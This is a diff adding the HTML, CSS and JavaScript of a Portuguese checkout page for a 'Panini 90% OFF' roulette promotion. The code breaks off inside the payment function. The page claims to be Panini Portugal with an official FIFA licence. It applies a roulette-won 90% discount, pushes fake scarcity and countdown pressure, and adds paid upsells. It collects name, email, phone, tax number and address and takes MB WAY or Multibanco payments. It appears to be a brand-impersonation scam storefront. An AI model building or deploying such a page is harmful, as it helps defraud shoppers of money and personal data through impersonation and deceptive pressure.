@@ -1,0 +1,1007 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+<meta name="theme-color" content="#c62828" />
+<title>Checkout — Panini Promoção 90% OFF</title>
+<meta name="description" content="Finaliza a tua encomenda Panini com 90% de desconto. Pagamento seguro MB WAY / Multibanco." />
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%23ffd400'/%3E%3Ctext x='16' y='22' font-size='16' font-weight='900' text-anchor='middle' fill='%23c62828' font-family='system-ui'%3EP%3C/text%3E%3C/svg%3E" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init','1485033180084660');fbq('track','PageView');
+fbq('track','InitiateCheckout');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1485033180084660&ev=PageView&noscript=1"/></noscript>
+
+<style>
+*,*::before,*::after{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  --color-primary:#d62828;
+  --color-secondary:#ffcc00;
+  --color-accent:#0a3d91;
+  --color-background:#fafaf6;
+  --color-foreground:#1a1f30;
+  --color-muted-fg:#6e7383;
+  --color-card:#ffffff;
+  --font-display:'Bebas Neue','Impact',sans-serif;
+  --font-sans:'Inter',system-ui,sans-serif;
+  font-family:var(--font-sans);
+  color:var(--color-foreground);
+  background:var(--color-background);
+  line-height:1.5;
+  -webkit-font-smoothing:antialiased;
+  font-size:14px;
+}
+img{max-width:100%;display:block}
+button{font-family:inherit;cursor:pointer;border:0;background:none;color:inherit}
+a{color:inherit;text-decoration:none}
+
+/* listra colorida */
+.panini-stripe{
+  height:8px;width:100%;
+  background:repeating-linear-gradient(90deg,
+    #d60016 0% 40px,#db0008 40px,#df0a02,#e22901,#e74a00,#f07900 40px,
+    #fac700 40px 80px,#f7c400 80px,#f3c20e,#ebbe2a,#dab645,#baa562,#7c8280,#405b8f 80px,
+    #0a2896 80px 120px,#003f89 120px,#004f80,#006972,#00825c,#018f4a 120px,
+    #189a30 120px 160px);
+}
+
+/* header */
+.topbar{background:#fff;border-bottom:1px solid #efefef}
+.topbar-inner{
+  max-width:1152px;margin:0 auto;
+  display:flex;align-items:center;gap:16px;
+  padding:12px 16px;
+}
+.topbar-logo-link{display:flex;align-items:center;gap:12px;flex-shrink:0}
+.topbar-logo-img{height:40px;width:auto}
+
+/* main grid */
+.main-wrap{
+  max-width:1152px;
+  margin:0 auto;
+  padding:20px 16px 40px;
+}
+.checkout-grid{
+  display:grid;
+  grid-template-columns:1fr;
+  gap:24px;
+}
+@media (min-width:1024px){
+  .checkout-grid{grid-template-columns:1fr 380px;align-items:start}
+}
+
+/* banner desconto */
+.discount-banner{
+  background:var(--color-primary);
+  color:#fff;
+  border-radius:12px;
+  padding:18px 20px;
+  margin-bottom:24px;
+  box-shadow:0 10px 25px -5px rgba(214,40,40,0.25);
+}
+.discount-banner h2{
+  margin:0 0 6px;
+  font-family:var(--font-display);
+  font-size:24px;letter-spacing:1px;
+  display:inline-flex;align-items:center;gap:8px;
+}
+.discount-banner p{
+  margin:0 0 12px;
+  font-size:13px;line-height:1.5;
+  opacity:0.95;
+}
+.discount-banner .db-pill{
+  display:inline-block;
+  background:var(--color-secondary);
+  color:#1a1a1a;
+  padding:6px 14px;border-radius:9999px;
+  font-family:var(--font-display);
+  font-size:15px;letter-spacing:1px;
+}
+
+/* section heading */
+.section-head{
+  display:flex;align-items:baseline;justify-content:space-between;
+  flex-wrap:wrap;gap:10px;
+  margin-bottom:14px;
+}
+.section-head h2{
+  margin:0;
+  font-family:var(--font-display);
+  font-size:32px;
+  color:var(--color-foreground);
+  letter-spacing:0;
+}
+.section-head .head-link{
+  font-size:13px;color:var(--color-primary);
+  font-weight:700;cursor:pointer;
+  text-decoration:underline;
+}
+
+/* cart items */
+.cart-list{
+  display:flex;flex-direction:column;gap:14px;
+  margin-bottom:32px;
+}
+.cart-item{
+  background:#fff;
+  border:1px solid #e8e8e3;
+  border-radius:12px;
+  padding:16px;
+  display:grid;
+  grid-template-columns:90px 1fr auto;
+  gap:14px;
+  align-items:start;
+}
+@media (max-width:480px){
+  .cart-item{grid-template-columns:70px 1fr}
+  .cart-item .ci-prices{grid-column:1/-1;text-align:right}
+}
+.ci-thumb{
+  width:90px;height:90px;
+  background:#fafaf6;
+  border:1px solid #e8e8e3;
+  border-radius:8px;
+  padding:6px;
+  display:flex;align-items:center;justify-content:center;
+}
+.ci-thumb img{max-width:100%;max-height:100%;object-fit:contain}
+.ci-info{min-width:0}
+.ci-name{
+  margin:0 0 6px;
+  font-size:14px;font-weight:800;
+  color:var(--color-foreground);
+  line-height:1.25;
+}
+.ci-kit-head{
+  display:flex;align-items:center;gap:6px;
+  margin:0 0 4px;font-size:12px;font-weight:700;
+}
+.ci-kit-list{margin:0 0 8px;padding:0;list-style:none}
+.ci-kit-list li{
+  display:flex;align-items:flex-start;gap:6px;
+  font-size:12px;color:var(--color-muted-fg);
+  padding:2px 0;
+}
+.ci-kit-list li::before{content:"✅";font-size:11px;flex-shrink:0}
+.ci-desc{
+  margin:0 0 8px;font-size:12px;
+  color:var(--color-muted-fg);line-height:1.4;
+  display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;
+}
+.ci-link{
+  font-size:12px;color:var(--color-primary);
+  font-weight:700;cursor:pointer;
+  display:block;margin-bottom:8px;
+}
+.ci-controls{
+  display:flex;align-items:center;gap:14px;
+  font-size:13px;
+}
+.ci-qty{
+  display:inline-flex;align-items:center;
+  background:#f5f5f0;
+  border:1px solid #e0e0d8;
+  border-radius:6px;
+  padding:2px;
+}
+.ci-qty button{
+  width:28px;height:28px;
+  background:#fff;
+  border:1px solid #e0e0d8;
+  border-radius:4px;
+  font-size:16px;font-weight:700;
+  cursor:pointer;
+  display:flex;align-items:center;justify-content:center;
+}
+.ci-qty button:hover{background:var(--color-primary);color:#fff}
+.ci-qty span{
+  font-family:var(--font-display);
+  font-size:18px;
+  min-width:30px;text-align:center;
+}
+.ci-remove{
+  color:var(--color-muted-fg);
+  text-decoration:underline;
+  font-size:13px;cursor:pointer;
+}
+.ci-remove:hover{color:var(--color-primary)}
+.ci-prices{
+  text-align:right;
+  display:flex;flex-direction:column;gap:2px;
+  white-space:nowrap;
+}
+.ci-price-old{color:var(--color-muted-fg);text-decoration:line-through;font-size:13px}
+.ci-price-new{
+  font-family:var(--font-display);
+  color:var(--color-primary);
+  font-size:26px;letter-spacing:0;
+}
+
+/* upsells */
+.upsells{
+  margin-bottom:32px;
+}
+.upsells h3{
+  margin:0 0 4px;
+  font-family:var(--font-display);
+  font-size:28px;color:var(--color-foreground);
+}
+.upsells .us-sub{
+  margin:0 0 14px;
+  font-size:13px;color:var(--color-muted-fg);
+}
+.upsells .us-sub strong{color:var(--color-foreground);font-weight:700}
+.upsell-list{display:flex;flex-direction:column;gap:10px}
+.upsell-item{
+  background:#fff;
+  border:1px solid #e8e8e3;
+  border-radius:10px;
+  padding:14px 16px;
+  display:grid;
+  grid-template-columns:22px 1fr auto;
+  gap:14px;
+  align-items:start;
+  cursor:pointer;
+  transition:border-color .15s;
+}
+.upsell-item:hover{border-color:var(--color-primary)}
+.upsell-item.selected{
+  border-color:var(--color-primary);
+  border-width:2px;padding:13px 15px;
+  background:#fff7f6;
+}
+.upsell-check{
+  width:22px;height:22px;border-radius:4px;
+  border:2px solid #c4c4c4;
+  background:#fff;
+  display:flex;align-items:center;justify-content:center;
+  margin-top:2px;
+  font-size:14px;
+  color:transparent;
+  transition:all .15s;
+}
+.upsell-item.selected .upsell-check{
+  background:var(--color-primary);
+  border-color:var(--color-primary);
+  color:#fff;
+}
+.upsell-name{
+  margin:0 0 4px;
+  font-size:14px;font-weight:800;
+  color:var(--color-foreground);
+}
+.upsell-desc{
+  margin:0;font-size:12px;
+  color:var(--color-muted-fg);
+  line-height:1.45;
+}
+.upsell-price{
+  text-align:right;white-space:nowrap;
+}
+.upsell-price .up-val{
+  font-family:var(--font-display);
+  color:var(--color-primary);
+  font-size:24px;
+}
+.upsell-price .up-tag{
+  display:block;font-size:10px;font-weight:700;
+  color:var(--color-muted-fg);
+  letter-spacing:1px;text-transform:uppercase;
+  margin-top:2px;
+}
+
+/* form */
+.form-section h3{
+  margin:0 0 14px;
+  font-family:var(--font-display);
+  font-size:28px;color:var(--color-foreground);
+}
+.form-card{
+  background:#fff;
+  border:1px solid #e8e8e3;
+  border-radius:12px;
+  padding:18px;
+}
+.form-row{margin-bottom:14px}
+.form-row.two{
+  display:grid;grid-template-columns:1fr 1fr;gap:10px;
+}
+.form-row label{
+  display:block;
+  font-size:12px;font-weight:700;
+  color:var(--color-foreground);
+  margin-bottom:6px;
+}
+.form-row input{
+  width:100%;
+  padding:11px 14px;
+  background:#fff;
+  border:1px solid #d4d4d0;
+  border-radius:8px;
+  font-family:inherit;font-size:14px;
+  color:var(--color-foreground);
+  outline:none;
+  transition:border-color .15s, box-shadow .15s;
+}
+.form-row input:focus{
+  border-color:var(--color-primary);
+  box-shadow:0 0 0 3px rgba(214,40,40,0.12);
+}
+.form-row .err{
+  display:block;font-size:12px;
+  color:var(--color-primary);
+  margin-top:4px;min-height:0;
+}
+.pay-methods{
+  display:grid;grid-template-columns:1fr 1fr;gap:10px;
+  margin-top:6px;
+}
+.pay-method{
+  background:#fff;
+  border:1.5px solid #d4d4d0;
+  border-radius:8px;
+  padding:14px;
+  text-align:center;
+  font-weight:700;font-size:14px;
+  cursor:pointer;
+  transition:all .15s;
+}
+.pay-method:hover{border-color:var(--color-primary)}
+.pay-method.selected{
+  border-color:var(--color-primary);
+  background:#fff7f6;
+  box-shadow:0 0 0 3px rgba(214,40,40,0.12);
+  color:var(--color-primary);
+}
+.form-hint{
+  margin:10px 0 0;
+  font-size:12px;color:var(--color-muted-fg);
+}
+
+/* resumo sidebar */
+.summary-card{
+  background:#fff;
+  border:2px solid var(--color-primary);
+  border-radius:12px;
+  padding:22px;
+  box-shadow:0 12px 25px -8px rgba(0,0,0,0.10);
+}
+@media (min-width:1024px){
+  .summary-card{position:sticky;top:24px}
+}
+.summary-card h3{
+  margin:0 0 12px;
+  font-family:var(--font-display);
+  font-size:28px;color:var(--color-foreground);
+}
+.summary-card hr{
+  border:0;border-top:1px solid #e8e8e3;
+  margin:14px 0;
+}
+.sum-row{
+  display:flex;justify-content:space-between;
+  font-size:14px;
+  color:var(--color-muted-fg);
+  padding:5px 0;
+}
+.sum-row.green{color:#16a34a;font-weight:700}
+.sum-row.total-row{
+  margin-top:14px;padding-top:14px;
+  border-top:1px solid #e8e8e3;
+  font-size:16px;
+  color:var(--color-foreground);
+  align-items:baseline;
+}
+.sum-row.total-row .sr-old{
+  color:var(--color-muted-fg);
+  text-decoration:line-through;
+  font-size:14px;font-weight:500;
+  margin-right:6px;
+}
+.sum-row.total-row .sr-new{
+  font-family:var(--font-display);
+  font-size:42px;
+  color:var(--color-primary);
+}
+.sum-extra{
+  margin:6px 0 0;
+  font-size:12px;color:var(--color-muted-fg);
+}
+.min-warning{
+  background:#fff8d6;
+  border:1px solid #ffd400;
+  border-radius:6px;
+  padding:8px 10px;
+  font-size:12px;color:#5a4500;
+  margin:12px 0 0;
+}
+.btn-pay{
+  width:100%;
+  background:#16a34a;color:#fff;
+  font-family:var(--font-display);
+  font-size:26px;letter-spacing:1px;
+  padding:16px;
+  border:0;border-radius:8px;
+  cursor:pointer;
+  margin-top:16px;
+  transition:transform .12s, background .15s;
+}
+.btn-pay:hover:not(:disabled){background:#15803d;transform:scale(1.02)}
+.btn-pay:disabled{background:#9ca3af;cursor:not-allowed;transform:none}
+.trust-list{
+  margin:12px 0 0;
+  padding:0;list-style:none;
+  font-size:12px;color:var(--color-muted-fg);
+}
+.trust-list li{padding:3px 0}
+.back-link{
+  display:block;text-align:center;
+  margin:14px 0 0;
+  font-size:13px;color:var(--color-muted-fg);
+  text-decoration:underline;
+}
+
+/* footer */
+.footer{
+  background:var(--color-accent);
+  color:#fafaf6;
+  text-align:center;
+  padding:18px 16px;
+  font-size:12px;letter-spacing:0.2px;
+}
+
+/* overlays */
+.overlay{position:fixed;inset:0;background:rgba(255,255,255,0.98);z-index:100;display:flex;align-items:center;justify-content:center;padding:20px}
+.overlay.hidden{display:none}
+.overlay-content{max-width:380px;width:100%;text-align:center}
+.overlay-content h2{margin:16px 0 6px;font-family:var(--font-display);font-size:32px;letter-spacing:1px;color:var(--color-foreground)}
+.overlay-content p{margin:0 0 18px;font-size:14px;color:var(--color-muted-fg);line-height:1.5}
+.spinner{width:48px;height:48px;border-radius:50%;border:4px solid #e5e7eb;border-top-color:var(--color-primary);margin:0 auto 16px;animation:spin .9s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.mb-ref-card{background:#fff;border:2px solid var(--color-primary);border-radius:10px;padding:14px;text-align:left;margin-top:14px}
+.mb-ref-card.hidden{display:none}
+.mbrc-title{margin:0 0 8px;font-size:13px;font-weight:700;color:var(--color-primary)}
+.mbrc-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px dashed #eaeae5;font-size:13px}
+.mbrc-row:last-child{border-bottom:0}
+.mbrc-row span{color:var(--color-muted-fg)}
+.mbrc-row strong{color:var(--color-foreground);font-weight:700}
+.result-icon{width:64px;height:64px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:32px;font-weight:700;color:#fff}
+.result-icon.success{background:#16a34a}
+.result-icon.failure{background:#c0392b}
+
+.empty-cart{
+  background:#fff;border:1px solid #e8e8e3;border-radius:12px;
+  padding:30px 18px;text-align:center;
+}
+.empty-cart h3{margin:0 0 8px;font-family:var(--font-display);font-size:26px}
+.empty-cart p{margin:0 0 14px;color:var(--color-muted-fg);font-size:13px}
+.empty-cart a{
+  background:var(--color-primary);color:#fff;
+  font-family:var(--font-display);font-size:18px;
+  padding:10px 22px;border-radius:6px;
+  display:inline-block;
+  border-bottom:3px solid #facc15;
+}
+</style>
+</head>
+<body>
+
+<div class="panini-stripe"></div>
+<header class="topbar">
+  <div class="topbar-inner">
+    <a class="topbar-logo-link" href="/">
+      <img src="/images/panini-logo.png" alt="Panini" class="topbar-logo-img" />
+    </a>
+  </div>
+</header>
+<div class="panini-stripe"></div>
+
+<main class="main-wrap">
+  <div class="checkout-grid">
+
+    <div>
+      <div class="discount-banner">
+        <h2>🎉 Desconto de 90% aplicado!</h2>
+        <p>Esta janela de preço fecha em breve. Finaliza já o checkout para não ficares para trás quando as vagas na promoção se esgotarem.</p>
+        <span class="db-pill">por tempo LIMITADO</span>
+      </div>
+
+      <div class="section-head">
+        <h2>O teu carrinho</h2>
+        <a class="head-link" href="/roleta">+ Adicionar mais produtos</a>
+      </div>
+
+      <div id="cartList" class="cart-list"></div>
+
+      <div class="upsells">
+        <h3>Ofertas exclusivas nesta página</h3>
+        <p class="us-sub">Toque para adicionar ao carrinho. Estes extras têm <strong>preço fixo</strong> (sem o desconto de 90% da roleta).</p>
+        <div class="upsell-list" id="upsellList"></div>
+      </div>
+
+      <div class="form-section">
+        <h3>Os teus dados</h3>
+        <div class="form-card">
+          <div class="form-row">
+            <label for="fName">Nome completo</label>
+            <input type="text" id="fName" placeholder="João Silva" autocomplete="name" />
+            <span class="err" data-err="name"></span>
+          </div>
+          <div class="form-row">
+            <label for="fEmail">E-mail</label>
+            <input type="email" id="fEmail" placeholder="joao@exemplo.pt" autocomplete="email" />
+            <span class="err" data-err="email"></span>
+          </div>
+          <div class="form-row">
+            <label for="fPhone">Telemóvel</label>
+            <input type="tel" id="fPhone" placeholder="912345678" maxlength="9" inputmode="numeric" autocomplete="tel" />
+            <span class="err" data-err="phone"></span>
+          </div>
+          <div class="form-row">
+            <label for="fNif">NIF / documento</label>
+            <input type="text" id="fNif" placeholder="123456789" maxlength="9" inputmode="numeric" />
+          </div>
+          <div class="form-row">
+            <label for="fAddress">Morada</label>
+            <input type="text" id="fAddress" placeholder="Rua, número, andar" autocomplete="street-address" />
+            <span class="err" data-err="address"></span>
+          </div>
+          <div class="form-row two">
+            <div>
+              <label for="fCp">Código postal</label>
+              <input type="text" id="fCp" placeholder="1000-000" maxlength="8" />
+              <span class="err" data-err="cp"></span>
+            </div>
+            <div>
+              <label for="fCity">Localidade</label>
+              <input type="text" id="fCity" placeholder="Lisboa" autocomplete="address-level2" />
+              <span class="err" data-err="city"></span>
+            </div>
+          </div>
+          <div class="form-row">
+            <label>Método de pagamento</label>
+            <div class="pay-methods">
+              <div class="pay-method selected" data-method="mbway">MB Way</div>
+              <div class="pay-method" data-method="multibanco">Multibanco</div>
+            </div>
+            <p class="form-hint">Pagamento processado pelo gateway WayMB.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <aside>
+      <div class="summary-card">
+        <h3>Resumo da encomenda</h3>
+        <hr />
+        <div class="sum-row"><span id="sumSubtotalLabel">Subtotal (0 itens)</span><span id="sumSubtotal">€0,00</span></div>
+        <div class="sum-row green"><span>Desconto da Roleta (90%)</span><span id="sumDiscount">−€0,00</span></div>
+        <div class="sum-row" id="sumUpsellRow" style="display:none"><span>Extras</span><span id="sumUpsells">€0,00</span></div>
+        <div class="sum-row"><span>Portes de envio</span><span style="color:var(--color-foreground);font-weight:600">Grátis</span></div>
+        <div class="sum-row total-row">
+          <span>Total a pagar</span>
+          <span><span class="sr-old" id="sumOldTotal">€0,00</span><span class="sr-new" id="sumTotal">€0,00</span></span>
+        </div>
+        <p class="sum-extra">ou 3× <span id="sum3x">€0,00</span> sem juros</p>
+        <div class="min-warning" id="minWarning" style="display:none">
+          Encomenda mínima: <strong>€20,00</strong> (só produtos da loja, após desconto).
+        </div>
+        <button type="button" class="btn-pay" id="btnPay">PAGAR AGORA</button>
+        <ul class="trust-list">
+          <li>✓ Envio em 24h para todo Portugal</li>
+          <li>✓ Pagamento 100% seguro (SSL)</li>
+          <li>✓ Garantia de 30 dias ou devolução</li>
+          <li>✓ Produto oficial licenciado FIFA</li>
+        </ul>
+        <a class="back-link" href="/roleta">← Voltar à loja</a>
+      </div>
+    </aside>
+
+  </div>
+</main>
+
+<footer class="footer">© 2026 Panini Portugal · Produto oficial licenciado FIFA World Cup 2026™</footer>
+
+<!-- Overlays -->
+<div class="overlay hidden" id="screen-waiting">
+  <div class="overlay-content">
+    <div class="spinner"></div>
+    <h2 id="waitingTitle">A AGUARDAR PAGAMENTO</h2>
+    <p id="waitingText">Confirma o pagamento no teu app MB WAY.</p>
+    <div class="mb-ref-card hidden" id="mbRefCard">
+      <p class="mbrc-title">Dados Multibanco</p>
+      <div class="mbrc-row"><span>Entidade</span><strong id="mbEntity">—</strong></div>
+      <div class="mbrc-row"><span>Referência</span><strong id="mbReference">—</strong></div>
+      <div class="mbrc-row"><span>Valor</span><strong id="mbAmount">—</strong></div>
+      <div class="mbrc-row"><span>Válido até</span><strong id="mbExpires">—</strong></div>
+    </div>
+  </div>
+</div>
+
+<div class="overlay hidden" id="screen-success">
+  <div class="overlay-content">
+    <div class="result-icon success">✓</div>
+    <h2>PAGAMENTO CONFIRMADO!</h2>
+    <p>Encomenda registada. Vais receber o produto em 1 a 3 dias úteis.</p>
+    <a class="btn-pay" style="display:inline-block;text-decoration:none" href="/">Voltar à loja</a>
+  </div>
+</div>
+
+<div class="overlay hidden" id="screen-failure">
+  <div class="overlay-content">
+    <div class="result-icon failure">✕</div>
+    <h2>PAGAMENTO NÃO CONCLUÍDO</h2>
+    <p id="failureMsg">Ocorreu um problema ao processar o pagamento. Tenta novamente.</p>
+    <button class="btn-pay" id="btnRetry" type="button">Tentar novamente</button>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   Checkout Roleta — multi-item + upsells + WayMB
+   ============================================================ */
+const PLACEHOLDER_IMG = '/images/produto-placeholder.svg';
+const MIN_ORDER = 20.00;
+
+const UPSELLS = [
+  { id:'upsell-pack-premium', icon:'🎁', name:'Upgrade Colecionador', price:14.99,
+    desc:'Adicione agora o Pack Premium com figurinhas extras e aumente as hipóteses de completar o seu álbum muito mais rápido. Oferta disponível apenas nesta página.' },
+  { id:'upsell-envio', icon:'🚚', name:'Envio Prioritário', price:4.99,
+    desc:'Receba a sua encomenda mais rapidamente com o processamento prioritário por apenas mais alguns euros.' },
+  { id:'upsell-edicao', icon:'⭐', name:'Edição Especial', price:19.99,
+    desc:'Poucas unidades disponíveis da versão especial para colecionadores da Panini.' },
+  { id:'upsell-surpresa', icon:'🎟️', name:'Pack Surpresa', price:9.99,
+    desc:'Alguns clientes estão a receber figurinhas raras e itens exclusivos no Pack Surpresa disponível hoje.' },
+];
+
+const state = {
+  cart: [],
+  upsells: {},
+  method: 'mbway',
+  txId: null,
+  pollTimer: null,
+};
+
+function fmt(v){
+  return new Intl.NumberFormat('pt-PT',{ style:'currency', currency:'EUR' }).format(v);
+}
+function getCookie(name){
+  const m = document.cookie.match(new RegExp('(^|; )' + name + '=([^;]+)'));
+  return m ? decodeURIComponent(m[2]) : null;
+}
+function getOrMakeVisitorId(){
+  let v = null;
+  try{ v = localStorage.getItem('panini_vid'); }catch(e){}
+  if (!v){
+    v = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2,9);
+    try{ localStorage.setItem('panini_vid', v); }catch(e){}
+  }
+  return v;
+}
+function getStoredUtms(){
+  try{ return JSON.parse(sessionStorage.getItem('checkout_utm_params_v1') || 'null'); }catch(e){ return null; }
+}
+function getCheckoutEventId(){
+  let id = sessionStorage.getItem('panini_checkout_eventid');
+  if (!id){ id = 'ev_' + Math.random().toString(36).slice(2) + Date.now().toString(36); sessionStorage.setItem('panini_checkout_eventid', id); }
+  return id;
+}
+function trackEvt(event, meta){
+  fetch('/api/track/event',{
+    method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({ visitorId:getOrMakeVisitorId(), event, page:'checkout-roleta', utm:getStoredUtms(), meta }),
+  }).catch(()=>{});
+}
+
+/* === LOAD CART === */
+function loadCart(){
+  try{
+    const raw = sessionStorage.getItem('roleta_cart_v1');
+    if (raw){
+      state.cart = JSON.parse(raw);
+    }
+  }catch(e){}
+}
+
+function saveCart(){
+  try{
+    sessionStorage.setItem('roleta_cart_v1', JSON.stringify(state.cart));
+  }catch(e){}
+}
+
+/* === RENDER CART === */
+function renderCart(){
+  const list = document.getElementById('cartList');
+  if (!state.cart.length){
+    list.innerHTML = '<div class="empty-cart"><h3>O teu carrinho está vazio</h3><p>Volta à loja para escolher produtos com 90% de desconto.</p><a href="/roleta">VOLTAR À LOJA</a></div>';
+    document.getElementById('btnPay').disabled = true;
+    updateSummary();
+    return;
+  }
+  let html = '';
+  state.cart.forEach(it => {
+    html += '<div class="cart-item">';
+    html += '<div class="ci-thumb"><img src="' + (it.img || PLACEHOLDER_IMG) + '" alt="" loading="lazy"/></div>';
+    html += '<div class="ci-info">';
+    html += '<h4 class="ci-name">' + escapeHtml(it.name) + '</h4>';
+    if (it.kit && it.kit.length){
+      html += '<p class="ci-kit-head">📒 O QUE INCLUI O KIT:</p><ul class="ci-kit-list">';
+      it.kit.forEach(k => { html += '<li>' + escapeHtml(k) + '</li>'; });
+      html += '</ul>';
+    } else if (it.desc){
+      html += '<p class="ci-desc">' + escapeHtml(it.desc) + '</p>';
+    }
+    html += '<span class="ci-link">Ver descrição completa</span>';
+    html += '<div class="ci-controls">';
+    html += '<div class="ci-qty">';
+    html += '<button type="button" data-dec="' + it.id + '">−</button>';
+    html += '<span>' + it.qty + '</span>';
+    html += '<button type="button" data-inc="' + it.id + '">+</button>';
+    html += '</div>';
+    html += '<span class="ci-remove" data-remove="' + it.id + '">Remover</span>';
+    html += '</div>';
+    html += '</div>';
+    html += '<div class="ci-prices">';
+    html += '<span class="ci-price-old">' + fmt(it.priceOriginal * it.qty) + '</span>';
+    html += '<span class="ci-price-new">' + fmt(it.priceFinal * it.qty) + '</span>';
+    html += '</div>';
+    html += '</div>';
+  });
+  list.innerHTML = html;
+  // bind controls
+  list.querySelectorAll('[data-inc]').forEach(b => b.addEventListener('click', () => incQty(b.getAttribute('data-inc'))));
+  list.querySelectorAll('[data-dec]').forEach(b => b.addEventListener('click', () => decQty(b.getAttribute('data-dec'))));
+  list.querySelectorAll('[data-remove]').forEach(b => b.addEventListener('click', () => removeItem(b.getAttribute('data-remove'))));
+  updateSummary();
+}
+
+function incQty(id){
+  const it = state.cart.find(c => c.id === id);
+  if (it){ it.qty++; saveCart(); renderCart(); }
+}
+function decQty(id){
+  const idx = state.cart.findIndex(c => c.id === id);
+  if (idx < 0) return;
+  if (state.cart[idx].qty > 1){ state.cart[idx].qty--; }
+  else { state.cart.splice(idx, 1); }
+  saveCart(); renderCart();
+}
+function removeItem(id){
+  state.cart = state.cart.filter(c => c.id !== id);
+  saveCart(); renderCart();
+}
+
+function escapeHtml(s){
+  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+/* === UPSELLS === */
+function renderUpsells(){
+  const list = document.getElementById('upsellList');
+  let html = '';
+  UPSELLS.forEach(u => {
+    const sel = state.upsells[u.id] ? 'selected' : '';
+    html += '<div class="upsell-item ' + sel + '" data-upsell="' + u.id + '">';
+    html += '<div class="upsell-check">' + (state.upsells[u.id] ? '✓' : '') + '</div>';
+    html += '<div>';
+    html += '<h4 class="upsell-name">' + u.icon + ' ' + u.name + '</h4>';
+    html += '<p class="upsell-desc">' + u.desc + '</p>';
+    html += '</div>';
+    html += '<div class="upsell-price"><span class="up-val">+' + fmt(u.price) + '</span><span class="up-tag">sem desconto</span></div>';
+    html += '</div>';
+  });
+  list.innerHTML = html;
+  list.querySelectorAll('[data-upsell]').forEach(el => {
+    el.addEventListener('click', () => {
+      const id = el.getAttribute('data-upsell');
+      state.upsells[id] = !state.upsells[id];
+      renderUpsells();
+      updateSummary();
+      trackEvt('upsell_toggle', { id, on: state.upsells[id] });
+    });
+  });
+}
+
+/* === SUMMARY === */
+function calcTotals(){
+  const subOriginal = state.cart.reduce((s,c) => s + c.priceOriginal * c.qty, 0);
+  const subFinal = state.cart.reduce((s,c) => s + c.priceFinal * c.qty, 0);
+  const upsellsTotal = UPSELLS.filter(u => state.upsells[u.id]).reduce((s,u) => s + u.price, 0);
+  const itemCount = state.cart.reduce((s,c) => s + c.qty, 0);
+  return {
+    subOriginal, subFinal, upsellsTotal, itemCount,
+    discount: +(subOriginal - subFinal).toFixed(2),
+    totalOld: +(subOriginal + upsellsTotal).toFixed(2),
+    total: +(subFinal + upsellsTotal).toFixed(2),
+  };
+}
+function updateSummary(){
+  const t = calcTotals();
+  const set = (id, val) => { const el = document.getElementById(id); if (el) el.textContent = val; };
+  set('sumSubtotalLabel', 'Subtotal (' + t.itemCount + ' ' + (t.itemCount === 1 ? 'item' : 'itens') + ')');
+  set('sumSubtotal', fmt(t.subOriginal));
+  set('sumDiscount', '−' + fmt(t.discount));
+  set('sumUpsells', fmt(t.upsellsTotal));
+  const upsellRow = document.getElementById('sumUpsellRow');
+  if (upsellRow) upsellRow.style.display = t.upsellsTotal > 0 ? 'flex' : 'none';
+  set('sumOldTotal', fmt(t.totalOld));
+  set('sumTotal', fmt(t.total));
+  set('sum3x', fmt(t.total / 3));
+  const min = document.getElementById('minWarning');
+  if (min) min.style.display = (t.subFinal < MIN_ORDER && t.subFinal > 0) ? 'block' : 'none';
+  const btn = document.getElementById('btnPay');
+  btn.disabled = (t.itemCount === 0);
+}
+
+/* === PAYMENT === */
+document.querySelectorAll('.pay-method').forEach(el => {
+  el.addEventListener('click', () => {
+    document.querySelectorAll('.pay-method').forEach(x => x.classList.remove('selected'));
+    el.classList.add('selected');
+    state.method = el.getAttribute('data-method');
+  });
+});
+
+function setError(field, msg){
+  const el = document.querySelector('[data-err="' + field + '"]');
+  if (el){
+    el.textContent = msg || '';
+  }
+}
+function clearErrors(){
+  document.querySelectorAll('.err').forEach(e => e.textContent = '');
+}
+function validate(){
+  clearErrors();
+  let ok = true;
+  const name = document.getElementById('fName').value.trim();
+  const email = document.getElementById('fEmail').value.trim();
+  const phone = document.getElementById('fPhone').value.trim();
+  const address = document.getElementById('fAddress').value.trim();
+  const cp = document.getElementById('fCp').value.trim();
+  const city = document.getElementById('fCity').value.trim();
+  if (!name || name.length < 2){ setError('name','Nome obrigatório.'); ok = false; }
+  if (!/^\S+@\S+\.\S+$/.test(email)){ setError('email','Email inválido.'); ok = false; }
+  if (!/^\d{9}$/.test(phone)){ setError('phone','Telemóvel: 9 dígitos.'); ok = false; }
+  if (!address || address.length < 4){ setError('address','Morada obrigatória.'); ok = false; }
+  if (!/^\d{4}-?\d{3}$/.test(cp)){ setError('cp','Formato 0000-000.'); ok = false; }
+  if (!city){ setError('city','Localidade obrigatória.'); ok = false; }
+  return ok;
+}
+
+async function processPayment(){
+  if (!validate()){ return; }
+  const totals = calcTotals();
+  if (totals.itemCount === 0) return;
+  const btn = document.getElementById('btnPay');
+  btn.disabled = true;
